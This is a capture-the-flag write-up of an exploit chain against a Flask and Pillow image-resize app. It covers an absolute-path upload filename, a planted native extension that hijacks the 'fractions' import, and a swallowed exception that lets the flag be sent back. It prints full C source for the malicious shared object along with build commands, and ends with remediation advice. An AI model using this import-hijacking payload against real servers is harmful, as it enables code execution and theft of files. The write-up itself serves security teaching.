1. Challenge Overview

The application looks harmless: upload an image, resize it to 800x800, and download the resized copy. The front end only accepts images, and the back end blacklists Python file extensions. The interesting part is that the application trusts the uploaded filename and later asks Pillow to open whatever path was written.

The final chain is short but sharp:

raw multipart filename
    -> arbitrary file write in /app
    -> plant fractions.abi3.so
    -> Pillow imports fractions during image parsing
    -> extension copies /app/flag.txt to the expected _resized path
    -> Flask send_file returns the flag

2. Source Code Review

The upload route is the main attack surface:

@app.route('/resize', methods=['POST'])
def upload_file():
    file = request.files['file']

    if is_extention_blacklisted(file.filename):
        return jsonify(message='File extension not allowed'), 403

    if is_content_type_blacklisted(file.content_type):
        return jsonify(message='File content type not allowed'), 403

    filename = file.filename
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)

    if os.path.exists(filepath):
        return "File already exists. Please rename your file and try again.", 400

    file.save(filepath)

    try:
        resizer(800, 800, "resize", filepath)
        new_resize_path = filepath.rsplit('.', 1)[0] + '_resized.' + filepath.rsplit('.', 1)[1]
        return send_file(new_resize_path, as_attachment=True)
    except Exception:
        return jsonify(message='Error occurred while resizing image'), 500

The helper code catches image parsing errors but does not raise them back to the route:

def resize_image(image_path, x, y):
    base, ext = os.path.splitext(image_path)
    new_image_path = f"{base}_resized{ext}"

    try:
        with Image.open(image_path) as img:
            img = img.resize((x, y))
            img.save(new_image_path)
    except Exception as e:
        print(f"Error resizing image: {e}")
        return None
Important detail: even if Pillow fails to parse the uploaded file, the route still computes new_resize_path and calls send_file(). If we can create that file ourselves during parsing, Flask will return it.

3. Bug 1 - Arbitrary File Write

The route uses the upload filename directly. In Python, if the second argument to os.path.join() is absolute, the earlier path is discarded. 

>>> os.path.join("uploads", "/app/fractions.abi3.so")
'/app/fractions.abi3.so'

That means a multipart upload can escape the intended uploads/ directory just by setting the filename field to an absolute path.

Multipart filename Server save path Impact
image.png uploads/image.png Normal upload
../x.png uploads/../x.png Relative traversal
/app/fractions.abi3.so /app/fractions.abi3.so Write directly into app root

The blacklist does not stop this payload because it only rejects filenames containing .py or .pyc. A native extension ending in .so is allowed.

4. Bug 2 - Python Import Hijacking

Python checks directories on sys.path when importing modules. In this deployment, Gunicorn runs the app from /app, so /app is importable. If we place a shared object called fractions.abi3.so there, Python can load it as the fractions module.

Pillow performs lazy imports while opening files. One of the modules imported during this process is fractions. So the uploaded file does not need to be a valid image. It only needs to reach Image.open() and trigger the import path. 

Image.open("/app/fractions.abi3.so")
    -> Pillow initializes plugins
    -> import fractions
    -> /app/fractions.abi3.so is loaded
    -> PyInit_fractions() runs
I used the ABI-stable extension suffix .abi3.so. That makes the payload portable across Python 3.x versions that support the limited API, avoiding a hard dependency on the exact .cpython-312-x86_64-linux-gnu.so suffix.

5. Building the Payload

The payload exports PyInit_fractions, which Python calls when importing the fractions module. Instead of doing real module work, it copies the flag into the exact file Flask will send back.

For filename /app/fractions.abi3.so, the route computes:

filepath = "/app/fractions.abi3.so"
new_resize_path = filepath.rsplit(".", 1)[0] + "_resized." + filepath.rsplit(".", 1)[1]

# result:
"/app/fractions.abi3_resized.so"

So the native extension writes the flag there:

#define Py_LIMITED_API 0x03080000
#include <Python.h>
#include <stdio.h>

static void copy_flag(void) {
    FILE *in = fopen("/app/flag.txt", "rb");
    FILE *out = fopen("/app/fractions.abi3_resized.so", "wb");

    if (!in || !out) {
        if (in) fclose(in);
        if (out) fclose(out);
        return;
    }

    char buf[4096];
    size_t n;

    while ((n = fread(buf, 1, sizeof(buf), in)) > 0) {
        fwrite(buf, 1, n, out);
    }

    fclose(in);
    fclose(out);
}

PyMODINIT_FUNC PyInit_fractions(void) {
    copy_flag();

    static struct PyModuleDef module = {
        PyModuleDef_HEAD_INIT,
        "fractions",
        NULL,
        -1,
        NULL
    };

    return PyModule_Create(&module);
}

Compile it locally:

gcc -shared -fPIC \
  -DPy_LIMITED_API=0x03080000 \
  $(python3-config --includes) \
  exploit_fractions_abi3.c \
  -o fractions.abi3.so

Upload the compiled shared object while forcing the multipart filename to /app/fractions.abi3.so. 

curl -sS -i \

7. Attack Chain Summary

+---------+----------------------------------------------------------+
| Step 1  | Upload file with filename=/app/fractions.abi3.so        |
|         | os.path.join("uploads", absolute_path) keeps /app path  |
+---------+----------------------------------------------------------+
| Step 2  | Application saves our native extension into /app         |
|         | Blacklist only blocks .py and .pyc, not .so              |
+---------+----------------------------------------------------------+
| Step 3  | Route calls resizer(), which calls Pillow Image.open()   |
|         | Pillow lazy-loads plugins and imports fractions          |
+---------+----------------------------------------------------------+
| Step 4  | Python resolves fractions from /app/fractions.abi3.so    |
|         | PyInit_fractions() executes inside the Flask process     |
+---------+----------------------------------------------------------+
| Step 5  | Payload copies /app/flag.txt to                         |
|         | /app/fractions.abi3_resized.so                           |
+---------+----------------------------------------------------------+
| Step 6  | Image parsing fails, but helper swallows the exception   |
|         | Flask still calls send_file() on the _resized path        |
+---------+----------------------------------------------------------+
| Step 7  | Response body contains the flag                          |
+---------+----------------------------------------------------------+

8. Remediation

Issue Fix
Raw upload filename Use werkzeug.utils.secure_filename() and generate server-side names.
Path escape Resolve the final path and verify it stays inside the upload directory.
Blacklist validation Use an allowlist of safe image extensions and verify content with Pillow before saving.
Swallowed resize errors Raise image processing failures and avoid calling send_file() after a failed resize.
Import hijacking surface Keep writable directories out of importable application paths.
Challenge Solved

Arbitrary file write -> Python import hijack -> Pillow lazy import -> flag disclosure
